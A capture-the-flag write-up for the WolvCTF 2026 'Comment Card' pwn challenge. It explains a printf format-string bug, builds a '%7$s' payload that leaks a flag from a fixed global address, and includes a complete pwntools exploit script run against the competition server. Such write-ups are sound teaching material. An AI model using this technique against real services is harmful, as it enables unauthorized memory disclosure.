---
title: Comment Card
challenge_type: Pwn
difficulty: Easy
author: 0xir0nroot
writeup_author: "@xabito"
competition: wolvctf-2026
summary: |-
  The dining hall feedback kiosk repeats your comment back to you. Make sure you phrase things carefully.
connections:
  - url: comment-card.wolvctf-2026.kctf.cloud:1337
attachments:
  - title: dis.tar.gz
    url: /assets/files/wolvctf-2026/comment-card/dis.tar.gz
---

## Recon

We unpacked the 16 KB `chal` binary. It is dynamically linked and not stripped,
with source file `vuln.c`. Its imports (`fgets`, `read`, `printf`, `fopen`) and
strings (`flag.txt`, `Leave your comment: `) indicate that the flag is read into
memory at startup and user input reaches `printf`.

```bash
$ checksec --file=chal
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

With no PIE, global addresses in the disassembly are the same on the remote
service.

## Exploitation

`loadFlag` reads the flag into a fixed global buffer at **`0x404040`**:

```console
$ objdump -d chal
00000000004011b2 <loadFlag>:
   mov  esi, 0x100
   mov  edi, 0x404040        ; fgets(0x404040, 0x100, fp)
   call fgets
```

`feedbackKiosk` then passes the user's comment directly to `printf` as the format
string:

```asm
000000000040120d <feedbackKiosk>:
   sub  rsp, 0x100
   lea  rax, [rbp - 0x100]
   mov  edx, 0xff
   call read                 ; read(0, buf, 0xff)
   lea  rax, [rbp - 0x100]
   mov  rdi, rax
   mov  eax, 0x0
   call printf               ; printf(buf)  <-- the bug
```

The payload uses `%7$s` to dereference the qword (an 8-byte value) at `buf+8`
and print the string at that address. `%7$s` treats the 7th variadic argument as
a string pointer. The first arguments past the format string come from the
buffer itself, so position 7 lands on the 8-byte value we control at `buf+8`.
The `p64` helper packs a value as an 8-byte little-endian pointer. For
`0x404040`, that pointer contains NUL bytes (zero bytes) that would terminate
the format string, so we put `%7$sAAAA` first and append `p64(0x404040)`. The
four `A` bytes pad the format to 8 bytes, placing the appended address at
`buf+8`:

```python
payload = b"%7$sAAAA" + p64(0x404040)
```

## Flag capture

We sent that single payload to the remote service with the following script:

```python
import sys
from pwn import *

context.log_level = 'info'
FLAG_ADDR = 0x404040

payload = b"%7$sAAAA" + p64(FLAG_ADDR)

if len(sys.argv) > 1 and sys.argv[1] == 'local':
    io = process('./chal')
else:
    io = remote('comment-card.wolvctf-2026.kctf.cloud', 1337)

io.sendline(payload)
data = io.recvall(timeout=10)
print(data.decode(errors='replace'))
```

The flag appeared immediately after the echo:

```
== proof-of-work: disabled ==
=== Dining Hall Feedback Kiosk ===
Leave your comment:
Thanks for your comment: wctf{c0mm3nt_hqwx3i5r9jhjik7d}
AAAA@@@
```
